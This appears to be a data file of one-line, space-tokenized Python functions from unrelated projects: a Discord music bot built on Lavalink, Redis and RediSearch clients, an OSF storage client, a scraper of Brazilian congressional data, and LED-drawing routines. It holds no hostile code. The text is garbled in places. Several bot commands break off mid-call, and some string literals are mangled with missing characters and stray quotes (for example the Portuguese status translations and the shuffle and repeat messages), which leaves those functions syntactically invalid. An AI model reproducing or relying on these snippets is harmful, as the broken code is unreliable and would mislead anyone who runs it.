def open ( self ) : if self . _open : return self . _port = adsPortOpenEx ( ) if linux : adsAddRoute ( self . _adr . netIdStruct ( ) , self . ip_address ) self . _open = True
def fetch ( self , start_date , end_date ) : records = [ ] for two_months_range in self . _generate_ranges ( start_date , end_date ) : log . debug ( two_months_range ) for record in self . _fetch_missions_for_range ( two_months_range [ 0 ] , two_months_range [ 1 ] ) : records . append ( record ) df = pd . DataFrame ( records , columns = [ 'participant' , 'destination' , 'subject' , 'start' , 'end' , 'canceled' , 'report_status' , 'report_details_link' ] ) translate_column ( df , 'report_status' , { 'Disponvel':   Available',  'Pendente' : 'Pending' , 'Em anlise':   Analysing',  'No se aplica':   Does not apply' } ) translate_column ( df , 'canceled' , { 'No':   No',  'Sim' : 'Yes' } ) return df . drop_duplicates ( )
def fetch ( self ) : xml = urllib . request . urlopen ( self . URL ) tree = ET . ElementTree ( file = xml ) records = self . _parse_deputies ( tree . getroot ( ) ) df = pd . DataFrame ( records , columns = ( 'congressperson_id' , 'budget_id' , 'condition' , 'congressperson_document' , 'civil_name' , 'congressperson_name' , 'picture_url' , 'gender' , 'state' , 'party' , 'phone_number' , 'email' ) ) return self . _translate ( df )
def remove_node ( self , node ) : self . nodes . remove ( node ) for x in xrange ( self . replicas ) : ring_key = self . hash_method ( b ( "%s:%d" % ( node , x ) ) ) self . ring . pop ( ring_key ) self . sorted_keys . remove ( ring_key )
def iter_nodes ( self , key ) : if len ( self . ring ) == 0 : yield None , None node , pos = self . get_node_pos ( key ) for k in self . sorted_keys [ pos : ] : yield k , self . ring [ k ]
def mget ( self , keys , * args ) : args = list_or_args ( keys , args ) server_keys = { } ret_dict = { } for key in args : server_name = self . get_server_name ( key ) server_keys [ server_name ] = server_keys . get ( server_name , [ ] ) server_keys [ server_name ] . append ( key ) for server_name , sub_keys in iteritems ( server_keys ) : values = self . connections [ server_name ] . mget ( sub_keys ) ret_dict . update ( dict ( zip ( sub_keys , values ) ) ) result = [ ] for key in args : result . append ( ret_dict . get ( key , None ) ) return result
def mset ( self , mapping ) : servers = { } for key , value in mapping . items ( ) : server_name = self . get_server_name ( key ) servers . setdefault ( server_name , [ ] ) servers [ server_name ] . append ( ( key , value ) ) for name , items in servers . items ( ) : self . connections [ name ] . mset ( dict ( items ) ) return True
async def connect ( self ) : await self . _lavalink . bot . wait_until_ready ( ) if self . _ws and self . _ws . open : log . debug ( 'WebSocket still open, closing...' ) await self . _ws . close ( ) user_id = self . _lavalink . bot . user . id shard_count = self . _lavalink . bot . shard_count or self . _shards headers = { 'Authorization' : self . _password , 'Num-Shards' : shard_count , 'User-Id' : str ( user_id ) } log . debug ( 'Preparing to connect to Lavalink' ) log . debug ( '    with URI: {}' . format ( self . _uri ) ) log . debug ( '    with headers: {}' . format ( str ( headers ) ) ) log . info ( 'Connecting to Lavalink...' ) try : self . _ws = await websockets . connect ( self . _uri , loop = self . _loop , extra_headers = headers ) except OSError as error : log . exception ( 'Failed to connect to Lavalink: {}' . format ( str ( error ) ) ) else : log . info ( 'Connected to Lavalink!' ) self . _loop . create_task ( self . listen ( ) ) version = self . _ws . response_headers . get ( 'Lavalink-Major-Version' , 2 ) try : self . _lavalink . _server_version = int ( version ) except ValueError : self . _lavalink . _server_version = 2 log . info ( 'Lavalink server version is {}' . format ( version ) ) if self . _queue : log . info ( 'Replaying {} queued events...' . format ( len ( self . _queue ) ) ) for task in self . _queue : await self . send ( * * task )
async def listen ( self ) : while not self . _shutdown : try : data = json . loads ( await self . _ws . recv ( ) ) except websockets . ConnectionClosed as error : log . warning ( 'Disconnected from Lavalink: {}' . format ( str ( error ) ) ) for g in self . _lavalink . players . _players . copy ( ) . keys ( ) : ws = self . _lavalink . bot . _connection . _get_websocket ( int ( g ) ) await ws . voice_state ( int ( g ) , None ) self . _lavalink . players . clear ( ) if self . _shutdown : break if await self . _attempt_reconnect ( ) : return log . warning ( 'Unable to reconnect to Lavalink!' ) break op = data . get ( 'op' , None ) log . debug ( 'Received WebSocket data {}' . format ( str ( data ) ) ) if not op : return log . debug ( 'Received WebSocket message without op {}' . format ( str ( data ) ) ) if op == 'event' : log . debug ( 'Received event of type {}' . format ( data [ 'type' ] ) ) player = self . _lavalink . players [ int ( data [ 'guildId' ] ) ] event = None if data [ 'type' ] == 'TrackEndEvent' : event = TrackEndEvent ( player , data [ 'track' ] , data [ 'reason' ] ) elif data [ 'type' ] == 'TrackExceptionEvent' : event = TrackExceptionEvent ( player , data [ 'track' ] , data [ 'error' ] ) elif data [ 'type' ] == 'TrackStuckEvent' : event = TrackStuckEvent ( player , data [ 'track' ] , data [ 'thresholdMs' ] ) if event : await self . _lavalink . dispatch_event ( event ) elif op == 'playerUpdate' : await self . _lavalink . update_state ( data ) elif op == 'stats' : self . _lavalink . stats . _update ( data ) await self . _lavalink . dispatch_event ( StatsUpdateEvent ( self . _lavalink . stats ) ) log . debug ( 'Closing WebSocket...' ) await self . _ws . close ( )
def connected_channel ( self ) : if not self . channel_id : return None return self . _lavalink . bot . get_channel ( int ( self . channel_id ) )
async def connect ( self , channel_id : int ) : ws = self . _lavalink . bot . _connection . _get_websocket ( int ( self . guild_id ) ) await ws . voice_state ( self . guild_id , str ( channel_id ) )
async def disconnect ( self ) : if not self . is_connected : return await self . stop ( ) ws = self . _lavalink . bot . _connection . _get_websocket ( int ( self . guild_id ) ) await ws . voice_state ( self . guild_id , None )
def store ( self , key : object , value : object ) : self . _user_data . update ( { key : value } )
def fetch ( self , key : object , default = None ) : return self . _user_data . get ( key , default )
def add ( self , requester : int , track : dict ) : self . queue . append ( AudioTrack ( ) . build ( track , requester ) )
def add_next ( self , requester : int , track : dict ) : self . queue . insert ( 0 , AudioTrack ( ) . build ( track , requester ) )
def add_at ( self , index : int , requester : int , track : dict ) : self . queue . insert ( min ( index , len ( self . queue ) - 1 ) , AudioTrack ( ) . build ( track , requester ) )
async def play ( self , track_index : int = 0 , ignore_shuffle : bool = False ) : if self . repeat and self . current : self . queue . append ( self . current ) self . previous = self . current self . current = None self . position = 0 self . paused = False if not self . queue : await self . stop ( ) await self . _lavalink . dispatch_event ( QueueEndEvent ( self ) ) else : if self . shuffle and not ignore_shuffle : track = self . queue . pop ( randrange ( len ( self . queue ) ) ) else : track = self . queue . pop ( min ( track_index , len ( self . queue ) - 1 ) ) self . current = track await self . _lavalink . ws . send ( op = 'play' , guildId = self . guild_id , track = track . track ) await self . _lavalink . dispatch_event ( TrackStartEvent ( self , track ) )
async def play_now ( self , requester : int , track : dict ) : self . add_next ( requester , track ) await self . play ( ignore_shuffle = True )
async def play_at ( self , index : int ) : self . queue = self . queue [ min ( index , len ( self . queue ) - 1 ) : len ( self . queue ) ] await self . play ( ignore_shuffle = True )
async def play_previous ( self ) : if not self . previous : raise NoPreviousTrack self . queue . insert ( 0 , self . previous ) await self . play ( ignore_shuffle = True )
async def stop ( self ) : await self . _lavalink . ws . send ( op = 'stop' , guildId = self . guild_id ) self . current = None
async def set_pause ( self , pause : bool ) : await self . _lavalink . ws . send ( op = 'pause' , guildId = self . guild_id , pause = pause ) self . paused = pause
async def seek ( self , pos : int ) : await self . _lavalink . ws . send ( op = 'seek' , guildId = self . guild_id , position = pos )
async def handle_event ( self , event ) : if isinstance ( event , ( TrackStuckEvent , TrackExceptionEvent ) ) or isinstance ( event , TrackEndEvent ) and event . reason == 'FINISHED' : await self . play ( )
def get ( self , guild_id ) : if guild_id not in self . _players : p = self . _player ( lavalink = self . lavalink , guild_id = guild_id ) self . _players [ guild_id ] = p return self . _players [ guild_id ]
def remove ( self , guild_id ) : if guild_id in self . _players : self . _players [ guild_id ] . cleanup ( ) del self . _players [ guild_id ]
async def _play ( self , ctx , * , query : str ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) query = query . strip ( '<>' ) if not url_rx . match ( query ) : query = f'ytsearch:{query}' tracks = await self . bot . lavalink . get_tracks ( query ) if not tracks : return await ctx . send ( 'Nothing found!' ) embed = discord . Embed ( color = discord . Color . blurple ( ) ) if 'list' in query and 'ytsearch:' not in query : for track in tracks : player . add ( requester = ctx . author . id , track = track ) embed . title = 'Playlist enqueued!' embed . description = f'Imported {len(tracks)} tracks from the playlist!' await ctx . send ( embed = embed ) else : track_title = tracks [ 0 ] [ "info" ] [ "title" ] track_uri = tracks [ 0 ] [ "info" ] [ "uri" ] embed . title = "Track enqueued!" embed . description = f'[{track_title}]({track_uri})' player . add ( requester = ctx . author . id , track = tracks [ 0 ] ) if not player . is_playing : await player . play ( )
async def _seek ( self , ctx , * , time : str ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is_playing : return await ctx . send ( 'Not playing.' ) seconds = time_rx . search ( time ) if not seconds : return await ctx . send ( 'You need to specify the amount of seconds to skip!' ) seconds = int ( seconds . group ( ) ) * 1000 if time . startswith ( '-' ) : seconds *= - 1 track_time = player . position + seconds await player . seek ( track_time ) await ctx . send ( f'Moved track to **{lavalink.Utils.format_time(track_time)}**' )
async def _skip ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is_playing : return await ctx . send ( 'Not playing.' ) await player . skip ( ) await ctx . send ( 
async def _stop ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is_playing : return await ctx . send ( 'Not playing.' ) player . queue . clear ( ) await player . stop ( ) await ctx . send ( 
async def _now ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) song = 'Nothing' if player . current : position = lavalink . Utils . format_time ( player . position ) if player . current . stream : duration = else : duration = lavalink . Utils . format_time ( player . current . duration ) song = f'**[{player.current.title}]({player.current.uri})**\n({position}/{duration})' embed = discord . Embed ( color = discord . Color . blurple ( ) , title = 'Now Playing' , description = song ) await ctx . send ( embed = embed )
async def _queue ( self , ctx , page : int = 1 ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . queue : return await ctx . send ( 'There\'s nothing in the queue! Why not queue something?' ) items_per_page = 10 pages = math . ceil ( len ( player . queue ) / items_per_page ) start = ( page - 1 ) * items_per_page end = start + items_per_page queue_list = '' for index , track in enumerate ( player . queue [ start : end ] , start = start ) : queue_list += f'`{index + 1}.` [**{track.title}**]({track.uri})\n' embed = discord . Embed ( colour = discord . Color . blurple ( ) , description = f'**{len(player.queue)} tracks**\n\n{queue_list}' ) embed . set_footer ( text = f'Viewing page {page}/{pages}' ) await ctx . send ( embed = embed )
async def _volume ( self , ctx , volume : int = None ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not volume : return await ctx . send (  await player . set_volume ( volume ) await ctx . send ( 
async def _shuffle ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is_playing : return await ctx . send ( 'Nothing playing.' ) player . shuffle = not player . shuffle await ctx . send ( ' | Shuffle ' +  ' n abled' if pl yer.sh u ffle el e 'd  
async def _repeat ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is_playing : return await ctx . send ( 'Nothing playing.' ) player . repeat = not player . repeat await ctx . send ( ' | Repeat ' +  ' n abled' if pl yer.re p eat el e 'd  
async def _remove ( self , ctx , index : int ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . queue : return await ctx . send ( 'Nothing queued.' ) if index > len ( player . queue ) or index < 1 : return await ctx . send ( f'Index has to be **between** 1 and {len(player.queue)}' ) index -= 1 removed = player . queue . pop ( index ) await ctx . send ( f'Removed **{removed.title}** from the queue.' )
async def _disconnect ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is_connected : return await ctx . send ( 'Not connected.' ) if not ctx . author . voice or ( player . is_connected and ctx . author . voice . channel . id != int ( player . channel_id ) ) : return await ctx . send ( 'You\'re not in my voicechannel!' ) player . queue . clear ( ) await player . disconnect ( ) await ctx . send ( 
async def ensure_voice ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is_connected : if not ctx . author . voice or not ctx . author . voice . channel : await ctx . send ( 'You aren\'t connected to any voice channel.' ) raise commands . CommandInvokeError ( 'Author not connected to voice channel.' ) permissions = ctx . author . voice . channel . permissions_for ( ctx . me ) if not permissions . connect or not permissions . speak : await ctx . send ( 'Missing permissions `CONNECT` and/or `SPEAK`.' ) raise commands . CommandInvokeError ( 'Bot has no permissions CONNECT and/or SPEAK' ) player . store ( 'channel' , ctx . channel . id ) await player . connect ( ctx . author . voice . channel . id ) else : if player . connected_channel . id != ctx . author . voice . channel . id : return await ctx . send ( 'Join my voice channel!' )
def unregister_hook ( self , func ) : if func in self . hooks : self . hooks . remove ( func )
async def dispatch_event ( self , event ) : log . debug ( 'Dispatching event of type {} to {} hooks' . format ( event . __class__ . __name__ , len ( self . hooks ) ) ) for hook in self . hooks : try : if asyncio . iscoroutinefunction ( hook ) : await hook ( event ) else : hook ( event ) except Exception as e : log . warning ( 'Encountered exception while dispatching an event to hook `{}` ({})' . format ( hook . __name__ , str ( e ) ) ) if isinstance ( event , ( TrackEndEvent , TrackExceptionEvent , TrackStuckEvent ) ) and event . player : await event . player . handle_event ( event )
async def update_state ( self , data ) : guild_id = int ( data [ 'guildId' ] ) if guild_id in self . players : player = self . players . get ( guild_id ) player . position = data [ 'state' ] . get ( 'position' , 0 ) player . position_timestamp = data [ 'state' ] [ 'time' ]
async def get_tracks ( self , query ) : log . debug ( 'Requesting tracks for query {}' . format ( query ) ) async with self . http . get ( self . rest_uri + quote ( query ) , headers = { 'Authorization' : self . password } ) as res : return await res . json ( content_type = None )
def destroy ( self ) : self . ws . destroy ( ) self . bot . remove_listener ( self . on_socket_response ) self . hooks . clear ( )
def build ( self , track , requester ) : try : self . track = track [ 'track' ] self . identifier = track [ 'info' ] [ 'identifier' ] self . can_seek = track [ 'info' ] [ 'isSeekable' ] self . author = track [ 'info' ] [ 'author' ] self . duration = track [ 'info' ] [ 'length' ] self . stream = track [ 'info' ] [ 'isStream' ] self . title = track [ 'info' ] [ 'title' ] self . uri = track [ 'info' ] [ 'uri' ] self . requester = requester return self except KeyError : raise InvalidTrack ( 'An invalid track was passed.' )
async def _previous ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) try : await player . play_previous ( ) except lavalink . NoPreviousTrack : await ctx . send ( 'There is no previous song to play.' )
async def _playnow ( self , ctx , * , query : str ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . queue and not player . is_playing : return await ctx . invoke ( self . _play , query = query ) query = query . strip ( '<>' ) if not url_rx . match ( query ) : query = f'ytsearch:{query}' results = await self . bot . lavalink . get_tracks ( query ) if not results or not results [ 'tracks' ] : return await ctx . send ( 'Nothing found!' ) tracks = results [ 'tracks' ] track = tracks . pop ( 0 ) if results [ 'loadType' ] == 'PLAYLIST_LOADED' : for _track in tracks : player . add ( requester = ctx . author . id , track = _track ) await player . play_now ( requester = ctx . author . id , track = track )
async def _playat ( self , ctx , index : int ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if index < 1 : return await ctx . send ( 'Invalid specified index.' ) if len ( player . queue ) < index : return await ctx . send ( 'This index exceeds the queue\'s length.' ) await player . play_at ( index - 1 )
async def _find ( self , ctx , * , query ) : if not query . startswith ( 'ytsearch:' ) and not query . startswith ( 'scsearch:' ) : query = 'ytsearch:' + query results = await self . bot . lavalink . get_tracks ( query ) if not results or not results [ 'tracks' ] : return await ctx . send ( 'Nothing found' ) tracks = results [ 'tracks' ] [ : 10 ] o = '' for index , track in enumerate ( tracks , start = 1 ) : track_title = track [ "info" ] [ "title" ] track_uri = track [ "info" ] [ "uri" ] o += f'`{index}.` [{track_title}]({track_uri})\n' embed = discord . Embed ( color = discord . Color . blurple ( ) , description = o ) await ctx . send ( embed = embed )
def _add_document ( self , doc_id , conn = None , nosave = False , score = 1.0 , payload = None , replace = False , partial = False , language = None , * * fields ) : if conn is None : conn = self . redis if partial : replace = True args = [ self . ADD_CMD , self . index_name , doc_id , score ] if nosave : args . append ( 'NOSAVE' ) if payload is not None : args . append ( 'PAYLOAD' ) args . append ( payload ) if replace : args . append ( 'REPLACE' ) if partial : args . append ( 'PARTIAL' ) if language : args += [ 'LANGUAGE' , language ] args . append ( 'FIELDS' ) args += list ( itertools . chain ( * fields . items ( ) ) ) return conn . execute_command ( * args )
def load_document ( self , id ) : fields = self . redis . hgetall ( id ) if six . PY3 : f2 = { to_string ( k ) : to_string ( v ) for k , v in fields . items ( ) } fields = f2 try : del fields [ 'id' ] except KeyError : pass return Document ( id = id , * * fields )
def info ( self ) : res = self . redis . execute_command ( 'FT.INFO' , self . index_name ) it = six . moves . map ( to_string , res ) return dict ( six . moves . zip ( it , it ) )
def get_args ( self ) : args = [ self . _query_string ] if self . _no_content : args . append ( 'NOCONTENT' ) if self . _fields : args . append ( 'INFIELDS' ) args . append ( len ( self . _fields ) ) args += self . _fields if self . _verbatim : args . append ( 'VERBATIM' ) if self . _no_stopwords : args . append ( 'NOSTOPWORDS' ) if self . _filters : for flt in self . _filters : assert isinstance ( flt , Filter ) args += flt . args if self . _with_payloads : args . append ( 'WITHPAYLOADS' ) if self . _ids : args . append ( 'INKEYS' ) args . append ( len ( self . _ids ) ) args += self . _ids if self . _slop >= 0 : args += [ 'SLOP' , self . _slop ] if self . _in_order : args . append ( 'INORDER' ) if self . _return_fields : args . append ( 'RETURN' ) args . append ( len ( self . _return_fields ) ) args += self . _return_fields if self . _sortby : assert isinstance ( self . _sortby , SortbyField ) args . append ( 'SORTBY' ) args += self . _sortby . args if self . _language : args += [ 'LANGUAGE' , self . _language ] args += self . _summarize_fields + self . _highlight_fields args += [ "LIMIT" , self . _offset , self . _num ] return args
def between ( a , b , inclusive_min = True , inclusive_max = True ) : return RangeValue ( a , b , inclusive_min = inclusive_min , inclusive_max = inclusive_max )
def geo ( lat , lon , radius , unit = 'km' ) : return GeoValue ( lat , lon , radius , unit )
def __reconstruct ( params ) : if isinstance ( params , dict ) : if '__class__' in params : cls = params [ '__class__' ] data = __reconstruct ( params [ 'params' ] ) return cls ( * * data ) else : data = dict ( ) for key , value in six . iteritems ( params ) : data [ key ] = __reconstruct ( value ) return data elif isinstance ( params , ( list , tuple ) ) : return [ __reconstruct ( v ) for v in params ] else : return params
def _get_param_names ( cls ) : init = cls . __init__ args , varargs = inspect . getargspec ( init ) [ : 2 ] if varargs is not None : raise RuntimeError ( 'BaseTransformer objects cannot have varargs' ) args . pop ( 0 ) args . sort ( ) return args
def get_params ( self ) : out = { } out [ '__class__' ] = self . __class__ out [ 'params' ] = dict ( steps = [ ] ) for name , step in self . steps : out [ 'params' ] [ 'steps' ] . append ( [ name , step . get_params ( deep = True ) ] ) return out
def __recursive_transform ( self , jam , steps ) : if len ( steps ) > 0 : head_transformer = steps [ 0 ] [ 1 ] for t_jam in head_transformer . transform ( jam ) : for q in self . __recursive_transform ( t_jam , steps [ 1 : ] ) : yield q else : yield jam
def __serial_transform ( self , jam , steps ) : # This uses the round-robin itertools recipe if six . PY2 : attr = 'next' else : attr = '__next__' pending = len ( steps ) nexts = itertools . cycle ( getattr ( iter ( D . transform ( jam ) ) , attr ) for ( name , D ) in steps ) while pending : try : for next_jam in nexts : yield next_jam ( ) except StopIteration : pending -= 1 nexts = itertools . cycle ( itertools . islice ( nexts , pending ) )
def file_empty ( fp ) : # for python 2 we need to use a homemade peek() if six . PY2 : contents = fp . read ( ) fp . seek ( 0 ) return not bool ( contents ) else : return not fp . peek ( )
def storage ( self , provider = 'osfstorage' ) : stores = self . _json ( self . _get ( self . _storages_url ) , 200 ) stores = stores [ 'data' ] for store in stores : provides = self . _get_attribute ( store , 'attributes' , 'provider' ) if provides == provider : return Storage ( store , self . session ) raise RuntimeError ( "Project has no storage " "provider '{}'" . format ( provider ) )
def storages ( self ) : stores = self . _json ( self . _get ( self . _storages_url ) , 200 ) stores = stores [ 'data' ] for store in stores : yield Storage ( store , self . session )
def remove ( self ) : response = self . _delete ( self . _delete_url ) if response . status_code != 204 : raise RuntimeError ( 'Could not delete {}.' . format ( self . path ) )
def init ( args ) : # reading existing config file, convert to configparser object config = config_from_file ( ) config_ = configparser . ConfigParser ( ) config_ . add_section ( 'osf' ) if 'username' not in config . keys ( ) : config_ . set ( 'osf' , 'username' , '' ) else : config_ . set ( 'osf' , 'username' , config [ 'username' ] ) if 'project' not in config . keys ( ) : config_ . set ( 'osf' , 'project' , '' ) else : config_ . set ( 'osf' , 'project' , config [ 'project' ] ) # now we can start asking for new values print ( 'Provide a username for the config file [current username: {}]:' . format ( config_ . get ( 'osf' , 'username' ) ) ) username = input ( ) if username : config_ . set ( 'osf' , 'username' , username ) print ( 'Provide a project for the config file [current project: {}]:' . format ( config_ . get ( 'osf' , 'project' ) ) ) project = input ( ) if project : config_ . set ( 'osf' , 'project' , project ) cfgfile = open ( ".osfcli.config" , "w" ) config_ . write ( cfgfile ) cfgfile . close ( )
def login ( self , username , password = None , token = None ) : self . session . basic_auth ( username , password )
def project ( self , project_id ) : type_ = self . guid ( project_id ) url = self . _build_url ( type_ , project_id ) if type_ in Project . _types : return Project ( self . _json ( self . _get ( url ) , 200 ) , self . session ) raise OSFException ( '{} is unrecognized type {}. Clone supports projects and registrations' . format ( project_id , type_ ) )
def guid ( self , guid ) : return self . _json ( self . _get ( self . _build_url ( 'guids' , guid ) ) , 200 ) [ 'data' ] [ 'type' ]
def _json ( self , response , status_code ) : if isinstance ( status_code , numbers . Integral ) : status_code = ( status_code , ) if response . status_code in status_code : return response . json ( ) else : raise RuntimeError ( "Response has status " "code {} not {}" . format ( response . status_code , status_code ) )
def _follow_next ( self , url ) : response = self . _json ( self . _get ( url ) , 200 ) data = response [ 'data' ] next_url = self . _get_attribute ( response , 'links' , 'next' ) while next_url is not None : response = self . _json ( self . _get ( next_url ) , 200 ) data . extend ( response [ 'data' ] ) next_url = self . _get_attribute ( response , 'links' , 'next' ) return data
def clear ( self ) : self . _desc = { } for key , value in merge . DEFAULT_PROJECT . items ( ) : if key not in self . _HIDDEN : self . _desc [ key ] = type ( value ) ( )
def error ( self , fail = True , action = '' ) : e = 'There was an unknown error communicating with the device.' if action : e = 'While %s: %s' % ( action , e ) log . error ( e ) if fail : raise IOError ( e )
def crop ( image , top_offset = 0 , left_offset = 0 , bottom_offset = 0 , right_offset = 0 ) : if bottom_offset or top_offset or left_offset or right_offset : width , height = image . size box = ( left_offset , top_offset , width - right_offset , height - bottom_offset ) image = image . crop ( box = box ) return image
def resize ( image , x , y , stretch = False , top = None , left = None , mode = 'RGB' , resample = None ) : if x <= 0 : raise ValueError ( 'x must be greater than zero' ) if y <= 0 : raise ValueError ( 'y must be greater than zero' ) from PIL import Image resample = Image . ANTIALIAS if resample is None else resample if not isinstance ( resample , numbers . Number ) : try : resample = getattr ( Image , resample . upper ( ) ) except : raise ValueError ( "(1) Didn't understand resample=%s" % resample ) if not isinstance ( resample , numbers . Number ) : raise ValueError ( "(2) Didn't understand resample=%s" % resample ) size = x , y if stretch : return image . resize ( size , resample = resample ) result = Image . new ( mode , size ) ratios = [ d1 / d2 for d1 , d2 in zip ( size , image . size ) ] if ratios [ 0 ] < ratios [ 1 ] : new_size = ( size [ 0 ] , int ( image . size [ 1 ] * ratios [ 0 ] ) ) else : new_size = ( int ( image . size [ 0 ] * ratios [ 1 ] ) , size [ 1 ] ) image = image . resize ( new_size , resample = resample ) if left is None : box_x = int ( ( x - new_size [ 0 ] ) / 2 ) elif left : box_x = 0 else : box_x = x - new_size [ 0 ] if top is None : box_y = int ( ( y - new_size [ 1 ] ) / 2 ) elif top : box_y = 0 else : box_y = y - new_size [ 1 ] result . paste ( image , box = ( box_x , box_y ) ) return result
def drawCircle ( self , x0 , y0 , r , color = None ) : md . draw_circle ( self . set , x0 , y0 , r , color )
def fillCircle ( self , x0 , y0 , r , color = None ) : md . fill_circle ( self . set , x0 , y0 , r , color )
def fillScreen ( self , color = None ) : md . fill_rect ( self . set , 0 , 0 , self . width , self . height , color )
def set_project ( self , project ) : def visit ( x ) : # Try to set_project, then recurse through any values() set_project = getattr ( x , 'set_project' , None ) if set_project : set_project ( project ) values = getattr ( x , 'values' , lambda : ( ) ) for v in values ( ) : visit ( v ) visit ( self . routing )
def set ( self , ring , angle , color ) : pixel = self . angleToPixel ( angle , ring ) self . _set_base ( pixel , color )
def get ( self , ring , angle ) : pixel = self . angleToPixel ( angle , ring ) return self . _get_base ( pixel )
def color_scale ( color , level ) : return tuple ( [ int ( i * level ) >> 8 for i in list ( color ) ] )
def save ( self , project_file = '' ) : self . _request_project_file ( project_file ) data_file . dump ( self . desc . as_dict ( ) , self . project_file )
def run ( self , next_task ) : self . event . wait ( ) self . task ( ) self . event . clear ( ) next_task . event . set ( )
def report ( function , * args , * * kwds ) : try : function ( * args , * * kwds ) except Exception : traceback . print_exc ( )
def _receive ( self , msg ) : msg = self . _convert ( msg ) if msg is None : return str_msg = self . verbose and self . _msg_to_str ( msg ) if self . verbose and log . is_debug ( ) : log . debug ( 'Message %s' , str_msg ) if self . pre_routing : self . pre_routing . receive ( msg ) receiver , msg = self . routing . receive ( msg ) if receiver : receiver . receive ( msg ) if self . verbose : log . info ( 'Routed message %s (%s) to %s' , str_msg [ : 128 ] , msg , repr ( receiver ) )
def setRGB ( self , pixel , r , g , b ) : self . _set_base ( pixel , ( r , g , b ) )
def setHSV ( self , pixel , hsv ) : color = conversions . hsv2rgb ( hsv ) self . _set_base ( pixel , color )
def fill ( self , color , start = 0 , end = - 1 ) : start = max ( start , 0 ) if end < 0 or end >= self . numLEDs : end = self . numLEDs - 1 for led in range ( start , end + 1 ) : # since 0-index include end in range self . _set_base ( led , color )
def fillRGB ( self , r , g , b , start = 0 , end = - 1 ) : self . fill ( ( r , g , b ) , start , end )
def fillHSV ( self , hsv , start = 0 , end = - 1 ) : self . fill ( conversions . hsv2rgb ( hsv ) , start , end )
def single ( method ) : @ functools . wraps ( method ) def single ( self , address , value = None ) : address = urllib . parse . unquote_plus ( address ) try : error = NO_PROJECT_ERROR if not self . project : raise ValueError error = BAD_ADDRESS_ERROR ed = editor . Editor ( address , self . project ) if value is None : error = BAD_GETTER_ERROR result = method ( self , ed ) else : error = BAD_SETTER_ERROR result = method ( self , ed , value ) result = { 'value' : result } except Exception as e : traceback . print_exc ( ) msg = '%s\n%s' % ( error . format ( * * locals ( ) ) , e ) result = { 'error' : msg } return flask . jsonify ( result ) return single
def multi ( method ) : @ functools . wraps ( method ) def multi ( self , address = '' ) : values = flask . request . values address = urllib . parse . unquote_plus ( address ) if address and values and not address . endswith ( '.' ) : address += '.' result = { } for a in values or '' : try : if not self . project : raise ValueError ( 'No Project is currently loaded' ) ed = editor . Editor ( address + a , self . project ) result [ address + a ] = { 'value' : method ( self , ed , a ) } except : if self . project : traceback . print_exc ( ) result [ address + a ] = { 'error' : 'Could not multi addr %s' % a } return flask . jsonify ( result ) return multi
def setRGB ( self , pixel , r , g , b ) : self . set ( pixel , ( r , g , b ) )
def setHSV ( self , pixel , hsv ) : color = conversions . hsv2rgb ( hsv ) self . set ( pixel , color )
def draw_circle ( setter , x0 , y0 , r , color = None ) : f = 1 - r ddF_x = 1 ddF_y = - 2 * r x = 0 y = r setter ( x0 , y0 + r , color ) setter ( x0 , y0 - r , color ) setter ( x0 + r , y0 , color ) setter ( x0 - r , y0 , color ) while x < y : if f >= 0 : y -= 1 ddF_y += 2 f += ddF_y x += 1 ddF_x += 2 f += ddF_x setter ( x0 + x , y0 + y , color ) setter ( x0 - x , y0 + y , color ) setter ( x0 + x , y0 - y , color ) setter ( x0 - x , y0 - y , color ) setter ( x0 + y , y0 + x , color ) setter ( x0 - y , y0 + x , color ) setter ( x0 + y , y0 - x , color ) setter ( x0 - y , y0 - x , color )
def fill_circle ( setter , x0 , y0 , r , color = None ) : _draw_fast_vline ( setter , x0 , y0 - r , 2 * r + 1 , color ) _fill_circle_helper ( setter , x0 , y0 , r , 3 , 0 , color )
def bresenham_line ( setter , x0 , y0 , x1 , y1 , color = None , colorFunc = None ) : steep = abs ( y1 - y0 ) > abs ( x1 - x0 ) if steep : x0 , y0 = y0 , x0 x1 , y1 = y1 , x1 if x0 > x1 : x0 , x1 = x1 , x0 y0 , y1 = y1 , y0 dx = x1 - x0 dy = abs ( y1 - y0 ) err = dx / 2 if y0 < y1 : ystep = 1 else : ystep = - 1 count = 0 for x in range ( x0 , x1 + 1 ) : if colorFunc : color = colorFunc ( count ) count += 1 if steep : setter ( y0 , x , color ) else : setter ( x , y0 , color ) err -= dy if err < 0 : y0 += ystep err += dx
def draw_rect ( setter , x , y , w , h , color = None , aa = False ) : _draw_fast_hline ( setter , x , y , w , color , aa ) _draw_fast_hline ( setter , x , y + h - 1 , w , color , aa ) _draw_fast_vline ( setter , x , y , h , color , aa ) _draw_fast_vline ( setter , x + w - 1 , y , h , color , aa )
def fill_rect ( setter , x , y , w , h , color = None , aa = False ) : for i in range ( x , x + w ) : _draw_fast_vline ( setter , i , y , h , color , aa )
def draw_triangle ( setter , x0 , y0 , x1 , y1 , x2 , y2 , color = None , aa = False ) : draw_line ( setter , x0 , y0 , x1 , y1 , color , aa ) draw_line ( setter , x1 , y1 , x2 , y2 , color , aa ) draw_line ( setter , x2 , y2 , x0 , y0 , color , aa )
